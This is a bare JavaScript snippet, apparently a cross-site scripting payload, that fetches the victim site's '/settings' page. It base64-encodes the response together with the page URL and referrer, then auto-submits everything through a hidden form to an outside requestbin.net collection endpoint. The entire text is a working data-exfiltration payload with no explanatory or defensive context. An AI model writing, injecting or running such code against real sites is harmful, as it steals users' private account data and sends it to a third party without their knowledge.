fetch("/settings").then(function(response) {
    response.text().then(function(back) {
        f = document.createElement("form");
        i = document.createElement("input");
        f.method = 'post';
        f.action = 'http://requestbin.net/r/rj93qcrj';
        i.name = 'data';
        i.value = btoa(encodeURI(back)+window.location.href+document.referrer);
        f.appendChild(i);
        document.body.appendChild(f);
        f.submit();
    })
})
